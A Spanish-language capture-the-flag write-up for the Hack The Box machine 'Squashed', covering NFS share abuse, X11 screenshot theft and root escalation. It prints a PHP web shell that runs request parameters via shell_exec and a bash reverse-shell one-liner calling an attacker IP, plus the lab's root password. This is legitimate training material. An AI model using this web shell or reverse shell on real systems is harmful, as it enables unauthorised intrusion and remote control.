---
title: Squashed - Hack The Box
description: >-
  En esta máquina se toca estos temas: Abusar de los propietarios asignados a los recursos compartidos de NFS mediante la creación de nuevos usuarios en el sistema  (Obtener acceso a la raíz web). Creación de un shell web para obtener acceso al sistema. Abuso del archivo .Xauthority (Pentesting X11). Tomar una captura de pantalla de la pantalla de otro usuario.
author: Mariano Alfonso
date: 2023-04-18
categories: [HackTheBox, Easy, CFTs]
tags: [Privilege Escalation, Pentesting, Linux, NFS mount]
image:
  path: /assets/img/HTB/writeup-squashed/Squashed.png
  alt: Máquina Squashed de la Plataforma Hack The Box.
---

---

## Introducción 📄
El presente Write Up explica los pasos para resolver la máquina  <span style="color:green"> **Squashed** </span> de la plataforma [HackTheBox](https://hackthebox.com).

## Reconocimiento de Puertos 🔍

Como siempre antes de escanear los puertos con **Nmap** le hacemos un <span style="color:red"> ping </span> a la maquina victima para ver si esta viva y nos responde.

![](/assets/img/HTB/writeup-squashed/TrazaICMP.png) _**Figure 1**: Traza ICMP._

En este caso nos responde y me arroja una **TTL** de 63, por lo que acercarse a 64, me enfrento a una maquina <span style="color:green"> Linux</span>.

<div style="display: flex; justify-content: center; width: 100%;">
  <table style="width: 100%; table-layout: fixed;">
    <caption style="caption-side: bottom; text-align: center; color: white;">
      <span style="font-weight: bold; color: white;">Table 1</span>: Información sobre el TTL y Sistema Operativo.
    </caption>
    <tr>
      <th style="text-align: center;">TTL</th>
      <th style="text-align: center;">Sistema Operativo</th>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word;">64</td>
      <td style="text-align: center; word-wrap: break-word;">Linux</td>
    </tr>
  </table>
</div>
 
Una vez que ya me comunique con la maquina y extraje el dato que es se trata de una maquina Linux, procedo a desplegar la herramienta Nmap.

```bash
# Primer con nmap  para sacar los puertos abiertos de la máquina
--------------------------------------------------------------
nmap -p- -n --open -sV --min-rate 5000 -vvv -n -Pn 10.10.11.191 
```

![](/assets/img/HTB/writeup-squashed/nmap1.png) _**Figure 2**: Primer Escaneo con Nmap._


```bash
# Segundo escaneo con los scripts default de nmap y tambien sacamos  la Versión y Servicio que tiran los puertos escaneados anteriormente 
--------------------------------------------------------------
nmap -sC -sV -p22,80,111,2049,39033 10.10.11.191
```

![](/assets/img/HTB/writeup-squashed/nmap2.png) _**Figure 3**: Segundo Escaneo con Nmap._

## Puerto 2049 

Por lo que veo, obtengo esta información y me doy cuenta que hay petisiones **nfs** en el **Puerto 2049**, al ser mi primera maquina de <span style="color:green"> HackTheBox </span>, acudo a <span style="color:red"> HackTricks </span>
para saber sobre NFS.

- [Recurso extraido de HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting)

```bash
# Primero hay que avriguar  que carpetas tiene el servidor disponibles para montar, lo averiguamos con este comando
--------------------------------------------------------------------------------
showmount -e <IP>
```

![](/assets/img/HTB/writeup-squashed/showmount.png) _**Figure 4**: Directorios Obtenidos._

Obtengo estos dos directorios:

<div style="display: flex; justify-content: center; width: 100%;">
  <table style="width: 100%; table-layout: fixed;">
    <caption style="caption-side: bottom; text-align: center; color: white;">
      <span style="font-weight: bold; color: white;">Table 2</span>: Rutas Obtenidas.
    </caption>
    <tr>
      <th style="text-align: center;" colspan="2">Rutas</th>
    </tr>
    <tr>
      <td style="text-align: center; word-wrap: break-word;">/home/ross</td>
      <td style="text-align: center; word-wrap: break-word;">/var/www/html</td>
    </tr>
  </table>
</div>

Y para montar estos dos directorios, me creo dos directorios llamados **/mnt/ross** y **/mnt/web_server** en el directorio **/mnt** y luego los monto.

```bash
# Creo los directorios
----------------------
sudo mkdir /mnt/ross
sudo mkdir /mnt/web_server
# Monto los directorios en cada carpeta
sudo mount 10.10.11.191:/home/ross /mnt/ross
sudo mount 10.10.11.191:/var/www/html /mnt/web_server
```

Una vez que hecho esto, listo los directorios a ver que encuentro...

![](/assets/img/HTB/writeup-squashed/listadodedirectorios.png) _**Figure 5**: Listado de Directorios._

Veo que existe un archivo  <span style="color:red">Passwords.kdbx</span> que  básicamente su extension <span style="color:red">.kdbx</span> indica que es la base de datos que usa keepass para almacenar las contraseñas, tambien se ve que en directorio **./we_server** no despliega nada, voy a ver si puedo acceder a el...

![](/assets/img/HTB/writeup-squashed/cdwebserver.png) _**Figure 6**: Directorio we_server_

Ok no tengo acceso a el, voy a ver que usuario tiene acceso el directorio.

![](/assets/img/HTB/writeup-squashed/usuarioquetieneprivilegio.png) _**Figure 7**: Usuario con bajos privilegios._

Ok pensando un poco podria burlar el **user1** creando uno en mi maquina. 

![](/assets/img/HTB/writeup-squashed/directorioswebserver.png) _**Figure 8**: Listado del Directorio web_server_

Como estoy en el directorio del servidor web y veo el archivo **index.html** , probare intentar cargar un archivo .php para poder poder ejecutar cualquier comando en la **URL**.

```php
<?php   
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
{: file='cmd.php'}

Una ves ejecutado este script puedo ejecutar cualquier comando en la URL.

![](/assets/img/HTB/writeup-squashed/cmd=ls-l.png) _**Figure 9**: Ejecución de Comandos en la URL._

Entonces puedo crear una Reverse Shell, pero antes me pongo en escucha con el puerto 1337 (en mi caso)

```bash
# Reverse Shell, encodear co el signo % al signo &
----------------------
bash -c "bash -i >%26 /dev/tcp/<IP ATACANTE>/1337 0>%261"
```

![](/assets/img/HTB/writeup-squashed/reverseshell.png) _**Figure 10**: Reverse Shell Obtenida._

Antes de continuar actualizo la tty. 

```bash
> script /dev/null -c bash
--------------------------
> Ctrl+z
--------------------------
> stty raw -echo; fg 
        reset xterm
--------------------------
export TERM=xterm
export SHELL=bash
```

## Escalada de Privilegios .Xauthority ☣️

Para <span style="color:red">conseguir la escalada de privilegios sigo estos pasos</span>:

* Primero me creo otro usuario para tener acceso al archivo .Xauthority.

* Pero no tengo acceso al archivo. 

![](/assets/img/HTB/writeup-squashed/usuarioquetieneprivilegio.png) _**Figure 11**: Usuario Sin Privilegios._

* Monto un servidor http con python3 en el puerto 8080 en el usuario que me cree hace un momento.

```bash
# Servidor python3 
------------------
python3 -m http.server 8080
```

* Una vez ya descargado el archivo **.Xauthority**, con ayuda HackTricks busco el comando para poder leer dicho archivo.

- [Recurso extraido de HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11)

No lo puedo leer, entonces saco un screenshot a la seccion keepas abierta del usuario. 

```bash
# Ejecuto el comando sacado de HakcTricks y lo guardo como archivo screenshot.xwd
------------------
xwd -root -screen -silent -display :0 > screenshot.xwd
```

![](/assets/img/HTB/writeup-squashed/Screenshotxwd.png) _**Figure 12**: Archivo Guardado en Formato .xwd_

Lo siguiente que hago es migrar a mi usuario de Kali para ponerme en escucha en el puerto 443, haci enviarme el archivo screenshot.xwd, dicho archivo se encuentra en el usuario **alex**.

```bash
# Covierto el archivo .xwd a .png (esto comando se encuentra en HackTricks, el enlace anteriormente mencionado)
------------------
convert screenshot.xwd screenshot.png
```

![](/assets/img/HTB/writeup-squashed/convert.png) _**Figure 13**: Convirtiendo Archivo .xwd a .png_

Abro el screenshot y listo ahi se ve la **password**.

![](/assets/img/HTB/writeup-squashed/screenshot.png) _**Figure 14**: Screenshot._

Por ultimo me dirijo al usuario alex y con las **password** <span style="color:red">cah$mei7rai9A</span> para comvertirme en usuario **root**.

![](/assets/img/HTB/writeup-squashed/rootalex.png) _**Figure 15**: Flag del User root._

Ya tenemos acceso a la <span style="color:red"> **Flag**.</span>
